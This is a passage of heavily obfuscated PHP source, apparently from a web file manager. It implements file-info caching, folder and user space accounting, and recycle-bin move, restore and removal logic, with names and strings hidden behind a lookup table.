$¾ì •êú[2311] . $Ñˆâ•şº[$¾ì •êú[561]]; if ($Ñˆâ•şº[$¾ì •êú[79]] <= 1024 * 10) { $á†åïò— = Cache::get($øëÒ¾ì); if (!$á†åïò—) { $á†åïò— = IO::getContent($Ñˆâ•şº[$¾ì •êú[87]]); Cache::set($øëÒ¾ì, $á†åïò—); } return $á†åïò—; } if (!$Ñˆâ•şº[$¾ì •êú[87]]) { return $¾ì •êú[12]; } return IO::getContent($Ñˆâ•şº[$¾ì •êú[87]]); } public function setDesc($‹èˆ×ï, $›¼ğ¸“–) { $œ†·‚Ğª =& $_SERVER[‹‰”››ê]; Model($œ†·‚Ğª[650])->eventAddDesc($‹èˆ×ï, $›¼ğ¸“–); return $this->metaSet($‹èˆ×ï, $œ†·‚Ğª[538], $›¼ğ¸“–); } public function setContent($íßêıÚ¡, $àÀÆˆĞ§ = '') { $°‘¬¬ƒ =& $_SERVER[‹‰”››ê]; $Œ½ÎÚÍˆ = $this->sourceInfo($íßêıÚ¡); $‰ˆêã— = $this->fileInfoGet($íßêıÚ¡); if (!$‰ˆêã— || !$Œ½ÎÚÍˆ) { return !1; } $õ¸–ö·Ñ = Model($°‘¬¬ƒ[558])->addFileByContent($àÀÆˆĞ§, $Œ½ÎÚÍˆ[$°‘¬¬ƒ[32]]); if (!$õ¸–ö·Ñ) { return !1; } $Å™º–Ï = $this->fileHistory($Œ½ÎÚÍˆ, $õ¸–ö·Ñ[$°‘¬¬ƒ[555]], $õ¸–ö·Ñ[$°‘¬¬ƒ[79]]); if (!$Å™º–Ï) { return Model($°‘¬¬ƒ[558])->remove($õ¸–ö·Ñ[$°‘¬¬ƒ[555]]); } $this->folderSizeReset($Œ½ÎÚÍˆ[$°‘¬¬ƒ[193]]); return !0; } public function fileSubstr($ùçœáÎ, $¬«¥”áä, $ØñÏ¬œ) { $°¦òïó = $this->fileInfoGet($ùçœáÎ); if (!$°¦òïó) { return !1; } return IO::fileSubstr($°¦òïó[$_SERVER[‹‰”››ê][87]], $¬«¥”áä, $ØñÏ¬œ); } public function fileInfoGet($˜üğÌ´Ä) { $¼ñìÇ²¶ =& $_SERVER[‹‰”››ê]; $™Ä­˜°È = $this->sourceInfo($˜üğÌ´Ä); if (!$™Ä­˜°È || $™Ä­˜°È[$¼ñìÇ²¶[497]]) { return !1; } $³Ö÷«¿å = $¼ñìÇ²¶[562] . $™Ä­˜°È[$¼ñìÇ²¶[555]]; $—Æ¢¨éÌ = _get(self::$cacheFileInfo, $³Ö÷«¿å); if ($—Æ¢¨éÌ) { return $—Æ¢¨éÌ; } $ø´— Æ´ = Model($¼ñìÇ²¶[558])->fileInfo($™Ä­˜°È[$¼ñìÇ²¶[555]]); if ($ø´— Æ´) { $ø´— Æ´[$¼ñìÇ²¶[32]] = $™Ä­˜°È[$¼ñìÇ²¶[32]]; } self::$cacheFileInfo[$³Ö÷«¿å] = $ø´— Æ´; return $ø´— Æ´; } private function folderChildrenNumber($¾ìˆ àˆ) { $ıò¸·°® =& $_SERVER[‹‰”››ê]; $Àİ³êŞ§ = $this->sourceInfo($¾ìˆ àˆ); $²¥áæÓ = array($ıò¸·°®[669] => array($ıò¸·°®[629], $Àİ³êŞ§[$ıò¸·°®[598]] . $¾ìˆ àˆ . $ıò¸·°®[630]), $ıò¸·°®[666] => $Àİ³êŞ§[$ıò¸·°®[583]], $ıò¸·°®[516] => intval($Àİ³êŞ§[$ıò¸·°®[517]]), $ıò¸·°®[663] => 1); $ˆÇîÕèş = $this->where($²¥áæÓ)->count(); $€éÉ‘µ = $this->where($²¥áæÓ)->where(array($ıò¸·°®[663] => 0))->count(); return array($ıò¸·°®[83] => $€éÉ‘µ, $ıò¸·°®[84] => $ˆÇîÕèş); } public function pathInfo($’Ÿ£Ä€Ã, $›‚ø¨à« = false) { $şë“ƒĞ³ =& $_SERVER[‹‰”››ê]; $›‚ø¨à« = !1; $’Ÿ£Ä€Ã = intval($’Ÿ£Ä€Ã); $éÜäæ–ñ = $şë“ƒĞ³[546] . intval($›‚ø¨à«) . $şë“ƒĞ³[474] . $’Ÿ£Ä€Ã; $È¡¶Ÿçı = _get(self::$cachePathInfo, $éÜäæ–ñ); if ($È¡¶Ÿçı) { return $È¡¶Ÿçı; } $ªˆ¬Ô“ = $this->sourceInfo($’Ÿ£Ä€Ã); if (!$ªˆ¬Ô“) { return !1; } $ªˆ¬Ô“ = $this->_listDataApplyItem($ªˆ¬Ô“, $›‚ø¨à«); self::$cachePathInfo[$éÜäæ–ñ] = $ªˆ¬Ô“; return $ªˆ¬Ô“; } public static $cachePathInfoMore = array(); public function pathInfoMore($ª™êÑ à) { $•ïí€ƒ’ =& $_SERVER[‹‰”››ê]; $–ŠÊâÒÛ = _get(self::$cachePathInfoMore, $ª™êÑ à); if ($–ŠÊâÒÛ) { return $–ŠÊâÒÛ; } $²üŸˆ‹ï = $this->pathInfo($ª™êÑ à); if (!$²üŸˆ‹ï) { return !1; } if ($²üŸˆ‹ï[$•ïí€ƒ’[497]] == $•ïí€ƒ’[91]) { $²üŸˆ‹ï[$•ïí€ƒ’[82]] = $this->folderChildrenNumber($ª™êÑ à); } self::$cachePathInfoMore[$ª™êÑ à] = $²üŸˆ‹ï; return $²üŸˆ‹ï; } public function sourceInfo($úÃ´¤ÃÔ) { $Í¼ËÄ“ =& $_SERVER[‹‰”››ê]; if (!$úÃ´¤ÃÔ) { return array(); } $úÃ´¤ÃÔ = intval($úÃ´¤ÃÔ); $¦­«•§‡ = $Í¼ËÄ“[545] . $úÃ´¤ÃÔ; $šùâÈÇï = _get(self::$cacheSourceInfo, $¦­«•§‡); if ($šùâÈÇï) { return $šùâÈÇï; } $ÛŒŒÛã = $this->where(array($Í¼ËÄ“[194] => $úÃ´¤ÃÔ))->find(); self::$cacheSourceInfo[$¦­«•§‡] = $ÛŒŒÛã; return self::$cacheSourceInfo[$¦­«•§‡]; } public function sourceCacheClear($ŠñùöèÅ = false) { self::cacheClear($ŠñùöèÅ); } public static function cacheClear($ç™­Üúä = false) { $ˆ‘²ÏÙ =& $_SERVER[‹‰”››ê]; if ($ç™­Üúä == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ˆ‘²ÏÙ[545] . $ç™­Üúä]); unset(self::$cachePathInfoMore[$ç™­Üúä]); unset(self::$cachePathInfo[$ˆ‘²ÏÙ[2312] . $ç™­Üúä]); unset(self::$cachePathInfo[$ˆ‘²ÏÙ[2313] . $ç™­Üúä]); } public function metaSet($¸ƒ¦¿ôÜ, $Á°ìñ° = null, $àœä”®ş = null) { $ô°€Ä•³ = parent::metaSet($¸ƒ¦¿ôÜ, $Á°ìñ°, $àœä”®ş); if ($ô°€Ä•³) { $this->sourceCacheClear($¸ƒ¦¿ôÜ); } return $ô°€Ä•³; } public function pathInfoByPath($–¾ øá, $¡§Ä–½) { $Şüé¶Äà =& $_SERVER[‹‰”››ê]; $”¶ÔºËõ = !$¡§Ä–½ ? array() : explode($Şüé¶Äà[8], trim($¡§Ä–½, $Şüé¶Äà[8])); $ëòàÜ†£ = $–¾ øá; foreach ($”¶ÔºËõ as $“°ñÎ×ü) { $ÜÄìÖÅÂ = array($Şüé¶Äà[193] => $ëòàÜ†£, $Şüé¶Äà[32] => $“°ñÎ×ü); $³²†©¼ô = $this->field($Şüé¶Äà[2314])->where($ÜÄìÖÅÂ)->select(); if (!$³²†©¼ô) { return !1; } $³²†©¼ô = array_sort_by($³²†©¼ô, $Şüé¶Äà[517]); $ëòàÜ†£ = $³²†©¼ô[0][$Şüé¶Äà[194]]; } $İ÷ğ‰Çš = $this->sourceInfo($ëòàÜ†£); $this->pathInfoFilter($İ÷ğ‰Çš); return $İ÷ğ‰Çš; } protected function updateModifyTime($ğõƒ–À) { $˜Ü¹ı…¿ =& $_SERVER[‹‰”››ê]; $íÎí§‚™ = defined($˜Ü¹ı…¿[2222]) ? USER_ID : 0; if (!$ğõƒ–À) { return; } if (!is_array($ğõƒ–À)) { $ğõƒ–À = array($ğõƒ–À); } foreach ($ğõƒ–À as $³€ÜãĞë => $­²¥Ò›ã) { $ğõƒ–À[$³€ÜãĞë] = intval($­²¥Ò›ã); $this->sourceCacheClear($­²¥Ò›ã); } $êÆÅ²Š = array($˜Ü¹ı…¿[194] => array($˜Ü¹ı…¿[7], $ğõƒ–À)); $üÜ™†Ûƒ = array($˜Ü¹ı…¿[668] => $íÎí§‚™, $˜Ü¹ı…¿[510] => time()); $this->where($êÆÅ²Š)->save($üÜ™†Ûƒ); } public function folderSizeReset($”ÑÃïœ, $­…İ“ôÉ = false) { $½Í‚£Š =& $_SERVER[‹‰”››ê]; if ($this->statusIgnoreResetSpace) { return; } $Úœ¾ö²Ú = $this->sourceInfo($”ÑÃïœ); $ğ§ŠúÄ¥ = $½Í‚£Š[2315] . $”ÑÃïœ; CacheLock::lock($ğ§ŠúÄ¥, 20); if ($­…İ“ôÉ === !1) { $this->sourceCacheClear($”ÑÃïœ); $Úœ¾ö²Ú = $this->sourceInfo($”ÑÃïœ); $»¾–ñÒÚ = array($½Í‚£Š[489] => $”ÑÃïœ, $½Í‚£Š[516] => 0); $“ºöĞ¢ = $this->where($»¾–ñÒÚ)->sum($½Í‚£Š[79]); $­…İ“ôÉ = intval($“ºöĞ¢) - intval($Úœ¾ö²Ú[$½Í‚£Š[79]]); } if ($­…İ“ôÉ == 0) { return CacheLock::unlock($ğ§ŠúÄ¥); } $ûü–°œ‚ = $this->parentLevelArray($Úœ¾ö²Ú[$½Í‚£Š[598]]); if (!$ûü–°œ‚) { $ûü–°œ‚ = array(); } $ûü–°œ‚[] = $Úœ¾ö²Ú[$½Í‚£Š[194]]; $»¾–ñÒÚ = array($½Í‚£Š[194] => array($½Í‚£Š[504], $ûü–°œ‚)); if ($­…İ“ôÉ < 0) { $»¾–ñÒÚ[$½Í‚£Š[79]] = array($½Í‚£Š[1108], abs($­…İ“ôÉ)); } $this->where($»¾–ñÒÚ)->setAdd($½Í‚£Š[79], $­…İ“ôÉ); CacheLock::unlock($ğ§ŠúÄ¥); $±èéÜ¶± = $½Í‚£Š[2316] . $Úœ¾ö²Ú[$½Í‚£Š[191]] . $½Í‚£Š[4] . $Úœ¾ö²Ú[$½Í‚£Š[583]]; $‘Îâæöõ = array($Úœ¾ö²Ú[$½Í‚£Š[191]], $Úœ¾ö²Ú[$½Í‚£Š[583]]); TaskRun::timeLimitCall($±èéÜ¶±, $½Í‚£Š[2317], $‘Îâæöõ, 1.5); } public function folderSizeResetChildren($®¡¼ÂáÊ) { $ÁÂÖ¡š =& $_SERVER[‹‰”››ê]; $this->sourceCacheClear($®¡¼ÂáÊ); $³çÜÄÄç = $this->sourceInfo($®¡¼ÂáÊ); $å‡ØŸÒÂ = array($ÁÂÖ¡š[663] => 1, $ÁÂÖ¡š[666] => $³çÜÄÄç[$ÁÂÖ¡š[583]], $ÁÂÖ¡š[669] => array($ÁÂÖ¡š[629], $³çÜÄÄç[$ÁÂÖ¡š[598]] . $®¡¼ÂáÊ . $ÁÂÖ¡š[630])); $Ğ†Ê¨Õ = $ÁÂÖ¡š[2318]; $Îà¿ˆ = $this->field($Ğ†Ê¨Õ)->where($å‡ØŸÒÂ)->select(); $å‡ØŸÒÂ[$ÁÂÖ¡š[497]] = 0; $ …Æƒ· = $this->field($Ğ†Ê¨Õ)->where($å‡ØŸÒÂ)->select(); if (!$ …Æƒ·) { return; } $Îà¿ˆ[] = $³çÜÄÄç; $Îà¿ˆ = array_to_keyvalue($Îà¿ˆ, $ÁÂÖ¡š[194]); foreach ($Îà¿ˆ as $”ùƒª  => $²Ë‚¿ÙŠ) { $Îà¿ˆ[$”ùƒª ][$ÁÂÖ¡š[2319]] = $Îà¿ˆ[$”ùƒª ][$ÁÂÖ¡š[79]]; $Îà¿ˆ[$”ùƒª ][$ÁÂÖ¡š[79]] = 0; } foreach ($ …Æƒ· as $²Ë‚¿ÙŠ) { $°æ¹å‰ = $²Ë‚¿ÙŠ[$ÁÂÖ¡š[193]] . $ÁÂÖ¡š[12]; if (!isset($Îà¿ˆ[$°æ¹å‰])) { continue; } if ($²Ë‚¿ÙŠ[$ÁÂÖ¡š[517]] == $Îà¿ˆ[$°æ¹å‰][$ÁÂÖ¡š[517]]) { $Îà¿ˆ[$°æ¹å‰][$ÁÂÖ¡š[79]] += $²Ë‚¿ÙŠ[$ÁÂÖ¡š[79]]; } } foreach ($Îà¿ˆ as $²Ë‚¿ÙŠ) { $³²«‚Äª = $this->parentLevelArray($²Ë‚¿ÙŠ[$ÁÂÖ¡š[598]]); foreach ($³²«‚Äª as $°æ¹å‰) { $°æ¹å‰ = $°æ¹å‰ . $ÁÂÖ¡š[12]; if (!isset($Îà¿ˆ[$°æ¹å‰])) { continue; } if ($²Ë‚¿ÙŠ[$ÁÂÖ¡š[517]] == $Îà¿ˆ[$°æ¹å‰][$ÁÂÖ¡š[517]]) { $Îà¿ˆ[$°æ¹å‰][$ÁÂÖ¡š[79]] += $²Ë‚¿ÙŠ[$ÁÂÖ¡š[79]]; } } } $ı’¼Ûó´ = array(); foreach ($Îà¿ˆ as $²Ë‚¿ÙŠ) { if ($²Ë‚¿ÙŠ[$ÁÂÖ¡š[79]] == $²Ë‚¿ÙŠ[$ÁÂÖ¡š[2319]]) { continue; } $ı’¼Ûó´[] = array($ÁÂÖ¡š[194], $²Ë‚¿ÙŠ[$ÁÂÖ¡š[194]], $ÁÂÖ¡š[79], $²Ë‚¿ÙŠ[$ÁÂÖ¡š[79]]); } $this->saveAll($ı’¼Ûó´); } public function userSpaceReset($””¾Ø‹Š = false) { $µÌÖóÉ =& $_SERVER[‹‰”››ê]; $ê‘Û = $this->where(array($µÌÖóÉ[191] => self::TYPE_USER, $µÌÖóÉ[583] => $””¾Ø‹Š, $µÌÖóÉ[497] => 0))->sum($µÌÖóÉ[79]); $ê‘Û = !$ê‘Û || $ê‘Û <= 0 ? 0 : $ê‘Û; Model($µÌÖóÉ[591])->userEdit($””¾Ø‹Š, array($µÌÖóÉ[1980] => $ê‘Û)); } public function targetSpaceUpdate($¾…ÔŠªã, $ñÑæß«Õ) { $¤¹ÕàÍ =& $_SERVER[‹‰”››ê]; if (!$ñÑæß«Õ) { return; } if (!in_array($¾…ÔŠªã, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $öóñ¶¥Æ = $this->targetSpaceSize($¾…ÔŠªã, $ñÑæß«Õ); if ($¾…ÔŠªã == self::TYPE_USER) { Model($¤¹ÕàÍ[591])->userEdit($ñÑæß«Õ, array($¤¹ÕàÍ[1980] => $öóñ¶¥Æ)); } else { if ($¾…ÔŠªã == self::TYPE_GROUP) { Model($¤¹ÕàÍ[599])->groupEdit($ñÑæß«Õ, array($¤¹ÕàÍ[1980] => $öóñ¶¥Æ)); } } } public function targetSpaceSize($öæàÕ×, $¸„éîñ) { $å·—öµ½ =& $_SERVER[‹‰”››ê]; $ñ°ƒìÃ‹ = 0; $¥ş°Àá = $this->targetSourceRoot($öæàÕ×, $¸„éîñ, !0); foreach ($¥ş°Àá as $°ñ’—´ß) { if (!$°ñ’—´ß) { continue; } $ñ°ƒìÃ‹ += floatval($°ñ’—´ß[$å·—öµ½[79]]); $“ÀÇŠé = array($å·—öµ½[669] => array($å·—öµ½[629], $å·—öµ½[607] . $°ñ’—´ß[$å·—öµ½[194]] . $å·—öµ½[630])); $òâäòÊª = Model($å·—öµ½[515])->field($å·—öµ½[503])->where($“ÀÇŠé)->select(); $òâäòÊª = array_to_keyvalue($òâäòÊª, $å·—öµ½[12], $å·—öµ½[194]); $òâäòÊª = array_unique(array_filter($òâäòÊª)); if ($òâäòÊª) { $“ÀÇŠé = array($å·—öµ½[503] => array($å·—öµ½[504], $òâäòÊª)); $ñ°ƒìÃ‹ += floatval($this->where($“ÀÇŠé)->sum($å·—öµ½[79])); } } $ñ°ƒìÃ‹ = !$ñ°ƒìÃ‹ || $ñ°ƒìÃ‹ <= 0 ? 0 : $ñ°ƒìÃ‹; return $ñ°ƒìÃ‹; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ï¯¯şâ¦) { return $this->fileTypeProfile($ï¯¯şâ¦, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ö«ŸöÇ) { return $this->fileTypeProfile($Ö«ŸöÇ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÔÕ¶áÄ™, $ÛîÈŠ) { $ë‡í¸”ó =& $_SERVER[‹‰”››ê]; $ŒÏ©ä = $ë‡í¸”ó[2320] . $ÔÕ¶áÄ™ . $ë‡í¸”ó[11] . $ÛîÈŠ; $Çš“½‘¿ = Cache::get($ŒÏ©ä); if ($Çš“½‘¿) { return $Çš“½‘¿; } $û§ïÍŸ = array($ë‡í¸”ó[663] => 0); if ($ÔÕ¶áÄ™ != !1) { $û§ïÍŸ[$ë‡í¸”ó[583]] = $ÔÕ¶áÄ™; $û§ïÍŸ[$ë‡í¸”ó[191]] = $ÛîÈŠ; } $¬ı¬À˜÷ = array(); $¬ı¬À˜÷[$ë‡í¸”ó[2321]] = array($ë‡í¸”ó[2322] => LNG($ë‡í¸”ó[2321]), $ë‡í¸”ó[2323] => $this->where($û§ïÍŸ)->count(), $ë‡í¸”ó[634] => $this->where($û§ïÍŸ)->sum($ë‡í¸”ó[79])); $Ò›àŒâó = KodIO::fileTypeList(); foreach ($Ò›àŒâó as $ú¾«ÚŠ¥ => $¨Ëèùìä) { $û§ïÍŸ[$ë‡í¸”ó[498]] = $this->fileTypeWhere($ú¾«ÚŠ¥); $¬ı¬À˜÷[$ú¾«ÚŠ¥] = array($ë‡í¸”ó[2322] => $¨Ëèùìä[$ë‡í¸”ó[32]], $ë‡í¸”ó[2323] => $this->where($û§ïÍŸ)->count(), $ë‡í¸”ó[634] => $this->where($û§ïÍŸ)->sum($ë‡í¸”ó[79])); } Cache::set($ŒÏ©ä, $¬ı¬À˜÷, 1200); return $¬ı¬À˜÷; } public function fileNameExist($Üó§‡, $Ç‹šÁÅÌ) { $©Êóö„ =& $_SERVER[‹‰”››ê]; $†Çü“Å‘ = $this->field($©Êóö„[2324])->where(array($©Êóö„[193] => $Üó§‡, $©Êóö„[32] => $Ç‹šÁÅÌ, $©Êóö„[517] => 0))->find(); return is_array($†Çü“Å‘) ? $†Çü“Å‘[$©Êóö„[194]] : !1; } public function childList($¶¨™¦Ñš) { $óİî˜´ =& $_SERVER[‹‰”››ê]; $ıèÇš» = $óİî˜´[2297] . $¶¨™¦Ñš; if (isset(self::$cacheChildList[$ıèÇš»])) { return self::$cacheChildList[$ıèÇš»]; } $™·¨Ü¯Í = array($óİî˜´[193] => intval($¶¨™¦Ñš), $óİî˜´[517] => 0); $÷‰î¢¿¥ = $this->where($™·¨Ü¯Í)->select(); $÷‰î¢¿¥ = $÷‰î¢¿¥ ? $÷‰î¢¿¥ : array(); self::$cacheChildList[$ıèÇš»] = $÷‰î¢¿¥; foreach ($÷‰î¢¿¥ as $øı©¥°Ã) { $ıèÇš» = $óİî˜´[545] . $øı©¥°Ã[$óİî˜´[194]]; self::$cacheSourceInfo[$ıèÇš»] = $øı©¥°Ã; } return $÷‰î¢¿¥; } public function fileNameAuto($„È’Ø€Ÿ, $í”à¨ı, $¬Õæ²­ = REPEAT_RENAME, $å˜¶Üİå = false) { $ƒñïÎ×ó =& $_SERVER[‹‰”››ê]; $†Ùß±øÔ = get_path_ext($í”à¨ı); $ÀËŸëÛ… = $†Ùß±øÔ ? get_path_ext_name($í”à¨ı) . $ƒñïÎ×ó[2325] . $†Ùß±øÔ : $í”à¨ı . $ƒñïÎ×ó[472]; $Òß‹È½¸ = array($ƒñïÎ×ó[193] => $„È’Ø€Ÿ, $ƒñïÎ×ó[517] => 0, $ƒñïÎ×ó[32] => array($ƒñïÎ×ó[471], $ÀËŸëÛ…)); $ ÚÆÀ = $this->field($ƒñïÎ×ó[32])->where($Òß‹È½¸)->select(); $ıÄ¬Î™³ = array_to_keyvalue($ ÚÆÀ, $ƒñïÎ×ó[12], $ƒñïÎ×ó[32]); return $this->fileNameAutoGet($ıÄ¬Î™³, $í”à¨ı, $¬Õæ²­, $å˜¶Üİå); } public function fileNameAutoGet($Á·ÄªÁ , $Û›ìÙÕš, $³ñ­ä®, $ù’™Û«é) { $ãŞ—›éÅ =& $_SERVER[‹‰”››ê]; if ($³ñ­ä® == REPEAT_REPLACE || !$Á·ÄªÁ  || !in_array_not_case($Û›ìÙÕš, $Á·ÄªÁ ) || $ù’™Û«é && $³ñ­ä® != REPEAT_RENAME_FOLDER) { return $Û›ìÙÕš; } if ($³ñ­ä® == REPEAT_SKIP) { return !1; } $Í¸÷­âÕ = $ãŞ—›éÅ[10] . get_path_ext($Û›ìÙÕš); $Í¸÷­âÕ = $Í¸÷­âÕ == $ãŞ—›éÅ[10] || $ù’™Û«é ? $ãŞ—›éÅ[12] : $Í¸÷­âÕ; for ($Âı˜¼Î÷ = 1; $Âı˜¼Î÷ <= count($Á·ÄªÁ ) + 1; $Âı˜¼Î÷++) { $¢Ç–‚™Ë = substr($Û›ìÙÕš, 0, strlen($Û›ìÙÕš) - strlen($Í¸÷­âÕ)); $™²Ìé§ = $¢Ç–‚™Ë . "\x28{$Âı˜¼Î÷}\51{$Í¸÷­âÕ}"; if (!in_array_not_case($™²Ìé§, $Á·ÄªÁ )) { return $™²Ìé§; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\162\x63\x65\137\162\x65\x63\171\143\x6c\145"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\x54\151\x6d\145", "\x74\x69\155\145", "\151\x6e\163\145\162\164", "\146\x75\x6e\x63\164\x69\157\x6e")); public function listData($¥“¹ÖÑ‹ = false) { $‘ÙùóÓ™ =& $_SERVER[‹‰”››ê]; $¥“¹ÖÑ‹ = $¥“¹ÖÑ‹ ? $¥“¹ÖÑ‹ : USER_ID; $¾¶ñ©¾ı = $this->where(array($‘ÙùóÓ™[1782] => $¥“¹ÖÑ‹))->select(); return array_to_keyvalue($¾¶ñ©¾ı, $‘ÙùóÓ™[12], $‘ÙùóÓ™[194]); } public function moveToRecycle($‚Œß°íª) { $ÕĞà÷¦ë =& $_SERVER[‹‰”››ê]; $«ñä¹ƒ› = Model($ÕĞà÷¦ë[1437]); $­ÖŠÔÍ = $«ñä¹ƒ›->sourceInfo($‚Œß°íª); if (!$­ÖŠÔÍ || $­ÖŠÔÍ[$ÕĞà÷¦ë[517]] == $ÕĞà÷¦ë[91]) { return; } $Ûî‰¤¿ö = array($ÕĞà÷¦ë[503] => $‚Œß°íª, $ÕĞà÷¦ë[1782] => USER_ID, $ÕĞà÷¦ë[665] => $­ÖŠÔÍ[$ÕĞà÷¦ë[191]], $ÕĞà÷¦ë[666] => $­ÖŠÔÍ[$ÕĞà÷¦ë[583]], $ÕĞà÷¦ë[669] => $­ÖŠÔÍ[$ÕĞà÷¦ë[598]]); $this->add($Ûî‰¤¿ö); $this->recycleMove($‚Œß°íª, 1); if ($­ÖŠÔÍ[$ÕĞà÷¦ë[497]] == $ÕĞà÷¦ë[91]) { $¬ÆòÈÕ¾ = array($ÕĞà÷¦ë[669] => array($ÕĞà÷¦ë[629], $­ÖŠÔÍ[$ÕĞà÷¦ë[598]] . $‚Œß°íª . $ÕĞà÷¦ë[630])); $«ñä¹ƒ›->where($¬ÆòÈÕ¾)->setField($ÕĞà÷¦ë[517], 1); } } public function clear() { $this->remove(!1); } public function remove($ÚÜ©´Ë¾ = false, $ÄÊ˜­²  = false) { $ö¾ô™üÙ =& $_SERVER[‹‰”››ê]; $ÄÊ˜­²  = $ÄÊ˜­²  ? $ÄÊ˜­²  : USER_ID; $ÇÃœà­… = Model($ö¾ô™üÙ[1437]); $ë…¸¬³¹ = $this->listData($ÄÊ˜­² ); $ÚÜ©´Ë¾ = $ÚÜ©´Ë¾ === !1 ? !1 : $ÚÜ©´Ë¾; $ÚÀ„¶í = array(); foreach ($ë…¸¬³¹ as $×í´‹) { if ($ÚÜ©´Ë¾ != !1 && !in_array($×í´‹, $ÚÜ©´Ë¾)) { continue; } $ö¾şÃ§™ = $ÇÃœà­…->sourceInfo($×í´‹); $ÇÃœà­…->remove($×í´‹, !1); $±Şô—ÊÅ = $ö¾şÃ§™[$ö¾ô™üÙ[191]] . $ö¾ô™üÙ[11] . $ö¾şÃ§™[$ö¾ô™üÙ[583]]; $ÚÀ„¶í[$±Şô—ÊÅ] = array($ö¾ô™üÙ[665] => $ö¾şÃ§™[$ö¾ô™üÙ[191]], $ö¾ô™üÙ[583] => $ö¾şÃ§™[$ö¾ô™üÙ[583]]); $this->where(array($ö¾ô™üÙ[194] => $×í´‹))->delete(); } foreach ($ÚÀ„¶í as $Ç¸‰œ–Ï) { $ÇÃœà­…->targetSpaceUpdate($Ç¸‰œ–Ï[$ö¾ô™üÙ[191]], $Ç¸‰œ–Ï[$ö¾ô™üÙ[583]]); } } public function restore($¿¾º™· = false) { $âÍì¢Ô‹ = $this->listData(); $this->_restoreSource($âÍì¢Ô‹, $¿¾º™·); } public function removeUserAll($©›¨ØÑÂ) { $this->remove(!1, $©›¨ØÑÂ); } public function restoreItem($¹Ï‚©ÉÑ) { $this->_restoreSource(array($¹Ï‚©ÉÑ), array($¹Ï‚©ÉÑ)); } private function _restoreSource($ùÅ”«áÔ, $•›“ğÆå) { $²™¸Ù¤ =& $_SERVER[‹‰”››ê]; $³æáñ×™ = Model($²™¸Ù¤[1437]); $•›“ğÆå = $•›“ğÆå == !1 ? !1 : $•›“ğÆå; if (!$ùÅ”«áÔ) { return !0; } $·ôşê‹© = array(); foreach ($ùÅ”«áÔ as $ó¿ù’ÛŸ) { if ($•›“ğÆå != !1 && !in_array($ó¿ù’ÛŸ, $•›“ğÆå)) { continue; } $Ü¶ØíŸã = $³æáñ×™->sourceInfo($ó¿ù’ÛŸ); $–‘üà’Ä = $³æáñ×™->sourceInfo($Ü¶ØíŸã[$²™¸Ù¤[193]]); if ($–‘üà’Ä[$²™¸Ù¤[517]] == $²™¸Ù¤[91]) { continue; } $³æáñ×™->lockMoveStart($ó¿ù’ÛŸ); $this->recycleMove($ó¿ù’ÛŸ, 0); if ($Ü¶ØíŸã[$²™¸Ù¤[497]] == $²™¸Ù¤[91]) { $ìé²¹­ = array($²™¸Ù¤[669] => array($²™¸Ù¤[629], $Ü¶ØíŸã[$²™¸Ù¤[598]] . $ó¿ù’ÛŸ . $²™¸Ù¤[630])); $³æáñ×™->where($ìé²¹­)->setField($²™¸Ù¤[517], 0); $this->restoreFolderChildren($ó¿ù’ÛŸ, $ùÅ”«áÔ); } $this->where(array($²™¸Ù¤[194] => $ó¿ù’ÛŸ))->delete(); $³æáñ×™->folderSizeReset($Ü¶ØíŸã[$²™¸Ù¤[193]]); $·ôşê‹©[] = $Ü¶ØíŸã[$²™¸Ù¤[193]]; if ($Ü¶ØíŸã[$²™¸Ù¤[497]] == $²™¸Ù¤[91]) { $·ôşê‹©[] = $ó¿ù’ÛŸ; } $³æáñ×™->lockMoveEnd($ó¿ù’ÛŸ); } $³æáñ×™->updateModifyTime($·ôşê‹©); } private function restoreFolderChildren($Éñ‚äŠä, $™¼§›Ê) { $ÅˆÉ€š‘ =& $_SERVER[‹‰”››ê]; $–Ï•©ê = Model($ÅˆÉ€š‘[1437]); $åùíö—á = array($ÅˆÉ€š‘[194] => array($ÅˆÉ€š‘[7], array())); foreach ($™¼§›Ê as $‚­•ò¾³) { if ($‚­•ò¾³ == $Éñ‚äŠä) { continue; } if (!$–Ï•©ê->isParentOf($Éñ‚äŠä, $‚­•ò¾³)) { continue; } $òÇâ–¦ = $–Ï•©ê->sourceInfo($‚­•ò¾³); if ($òÇâ–¦[$ÅˆÉ€š‘[497]] == $ÅˆÉ€š‘[91]) { $åùíö—á[] = array($ÅˆÉ€š‘[669] => array($ÅˆÉ€š‘[629], $òÇâ–¦[$ÅˆÉ€š‘[598]] . $‚­•ò¾³ . $ÅˆÉ€š‘[630])); } else { $åùíö—á[$ÅˆÉ€š‘[194]][1][] = $‚­•ò¾³; } } if (!$åùíö—á[$ÅˆÉ€š‘[194]][1]) { unset($åùíö—á[$ÅˆÉ€š‘[194]]); } if (!$åùíö—á) { return; } if (is_array($åùíö—á[$ÅˆÉ€š‘[194]]) && is_array($åùíö—á[$ÅˆÉ€š‘[194]][1])) { $åùíö—á[$ÅˆÉ€š‘[194]][1] = array_unique($åùíö—á[$ÅˆÉ€š‘[194]][1]); } $åùíö—á[$ÅˆÉ€š‘[1093]] = $ÅˆÉ€š‘[2094]; $–Ï•©ê->where($åùíö—á)->setField($ÅˆÉ€š‘[517], 1); } private function recycleMove($‚”® ØÍ, $‚à€ı©¹ = 1) { $Èğû·êÎ =& $_SERVER[‹‰”››ê]; $îÔòïÒÔ = Model($Èğû·êÎ[1437]); $„Íİ¥Ã¼ = Model($Èğû·êÎ[2326]); $†Ùµå½Û = array($Èğû·êÎ[194] => $‚”® ØÍ); if ($‚à€ı©¹) { $îÔòïÒÔ->where($†Ùµå½Û)->setField($Èğû·êÎ[517], 1); $„Íİ¥Ã¼->eventRecycle($‚”® ØÍ, $Èğû·êÎ[2327]); } else { $—»­ºŞ = $îÔòïÒÔ->where($†Ùµå½Û)->find(); $àª­²éô = $—»­ºŞ[$Èğû·êÎ[497]] == $Èğû·êÎ[91]; $éÎğÈ£ø = $îÔòïÒÔ->fileNameAuto($—»­ºŞ[$Èğû·êÎ[193]], $—»­ºŞ[$Èğû·êÎ[32]], REPEAT_RENAME_FOLDER, $àª­²éô); if 